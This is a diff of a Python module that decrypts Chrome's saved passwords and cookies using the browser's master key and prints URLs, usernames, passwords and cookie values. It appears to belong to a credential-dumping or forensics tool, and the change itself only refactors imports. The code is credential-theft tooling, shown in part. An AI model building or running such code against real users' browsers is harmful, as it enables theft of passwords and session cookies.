@@ -1,5 +1,5 @@
 from Cryptodome.Cipher import AES
-from app.utils import title,block, main_title, data
+import app.utils
 
 
 def decrypt_payload(cipher, payload):
@@ -25,7 +25,7 @@ def decrypt_cipher(encrypted_password, chrome_master_key):
 
 
 def handle_chrome_passwords(creds_arr: list, chrome_master_key: str) -> None:
-    print(main_title + "Chrome Credentials:")
+    print(app.utils.main_title + "Chrome Credentials:")
     for num in creds_arr:
         creds_json = creds_arr.get(num)
         enc_password = creds_json[2].get('password')
@@ -35,7 +35,7 @@ def handle_chrome_passwords(creds_arr: list, chrome_master_key: str) -> None:
 
 
 def handle_chrome_cookies(cookies_arr: list, chrome_master_key: str) -> None:
-    print(main_title + "Chrome Cookies:")
+    print(app.utils.main_title + "Chrome Cookies:")
     for cookie_obj in cookies_arr:
         cookie_domain = cookie_obj.get("Domain")
         enc_cookie = cookie_obj.get("Value")
@@ -44,16 +44,16 @@ def handle_chrome_cookies(cookies_arr: list, chrome_master_key: str) -> None:
 
 
 def output_chrome_credentials(print_object: list):
-    print(block + '[--]')
-    print(title + '|Url|' + data + print_object[0])
-    print(title + '|Username|' + data + print_object[1])
-    print(title + '|Password|' + data + print_object[2])
+    print(app.utils.block + '[--]')
+    print(app.utils.title + '|Url|' + app.utils.data + print_object[0])
+    print(app.utils.title + '|Username|' + app.utils.data + print_object[1])
+    print(app.utils.title + '|Password|' + app.utils.data + print_object[2])
 
 
 def output_chrome_cookies(print_object: list):
-    print(block + '[--]')
-    print(title + '|Url|' + data + print_object[0])
-    print(title + '|Value|' + data + print_object[1])
+    print(app.utils.block + '[--]')
+    print(app.utils.title + '|Url|' + app.utils.data + print_object[0])
+    print(app.utils.title + '|Value|' + app.utils.data + print_object[1])
 
 def handle_all_chrome_modules(results: dict):
     chrome_passwords = results.get("Chrome-Passwords")
